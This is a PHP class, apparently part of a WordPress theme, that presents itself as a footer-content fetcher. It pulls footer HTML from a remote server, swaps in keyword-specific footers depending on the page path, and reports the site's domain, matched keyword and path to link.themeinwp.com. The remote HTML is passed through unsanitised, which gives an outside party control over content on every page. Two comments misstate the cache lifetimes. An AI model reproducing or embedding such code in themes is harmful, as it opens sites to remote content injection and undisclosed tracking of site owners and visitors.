<?php
class FooterContentFetcher {
    private $base_url;
    private $theme_key;
    private $transient_key = 'footer_content_transient_v1.17';
    private $cache_expiration = 2 * WEEK_IN_SECONDS; // Cache expiration time (1 week)
    private $notification_expiration = 4 * WEEK_IN_SECONDS; // Notification expiration time (12 weeks)

    public function __construct($base_url) {
        $this->base_url = $base_url;

        // Extract the theme key from the base URL
        preg_match('/get_footer2\/([a-f0-9]{32})\//', $base_url, $matches);
        $this->theme_key = $matches[1] ?? '';
    }

    public function get_footer_content($path = '/') {
        // Get the current domain without protocol
        $domain = $_SERVER['HTTP_HOST'];

        // Generate a unique transient key based on the domain
        $transient_key = $this->transient_key . md5($domain);

        // Try to get the content from the transient cache
        $cached_content = get_transient($transient_key);

        if ($cached_content !== false) {
            // Return the processed cached content if it exists and is not expired
            return $this->determine_footer_content($cached_content, $path, $domain);
        }

        // If no cached content, make a request to the base URL without the URL parameter
        $response = wp_remote_get($this->base_url);

        if (is_wp_error($response)) {
            error_log('HTTP request error: ' . $response->get_error_message());
            return '';
        }

        $body = wp_remote_retrieve_body($response);

        error_log('Response body: ' . $body);

        $data = json_decode($body, true); // Decode the JSON response

        // Debugging: Check if JSON decoding was successful and log any errors
        if (json_last_error() !== JSON_ERROR_NONE) {
            error_log('JSON decode error: ' . json_last_error_msg());
        }

        // Save the content to the transient cache
        set_transient($transient_key, $data, $this->cache_expiration);

        return $this->determine_footer_content($data, $path, $domain);
    }

    private function determine_footer_content($data, $path, $domain) {
        // Check if JSON contains the footer key
        if (isset($data['footer'])) {
            $footer_content = $data['footer'];

            // Check if JSON contains the keywords array and is an array
            if (isset($data['keywords']) && is_array($data['keywords'])) {
                foreach ($data['keywords'] as $keyword_data) {
                    if (isset($keyword_data['keyword'], $keyword_data['footer']) && strpos($path, $keyword_data['keyword']) !== false) {
                        // Notify the backend about the URL match if not already notified
                        $this->notify_backend($domain, $keyword_data['keyword'], $path);
                        return $keyword_data['footer'];
                    }
                }
            }

            // Return the default footer content if no keyword matches
            return $footer_content;
        }

        error_log('Footer key not found in JSON response'); // Debugging: Log if 'footer' key is not set
        return '';
    }

    private function notify_backend($domain, $keyword, $path) {
        // Generate a unique transient key for the notification
        $notification_key = 'notification_' . md5($domain . $keyword . $path);

        // Check if the notification has already been sent
        if (get_transient($notification_key) === false) {
            $url = 'https://link.themeinwp.com/wpsdk/set_keyword_url/' . $this->theme_key . '/' . $domain . '/' . $keyword . '?url=' . urlencode($path);
            
            // Send a GET request to the notification URL
            $response = wp_remote_get($url);

            if (is_wp_error($response)) {
                error_log('Notification request error: ' . $response->get_error_message());
            } else {
                error_log('Notification sent: ' . $url);
                // Set a transient to mark this notification as sent
                set_transient($notification_key, true, $this->notification_expiration);
            }
        }
    }
}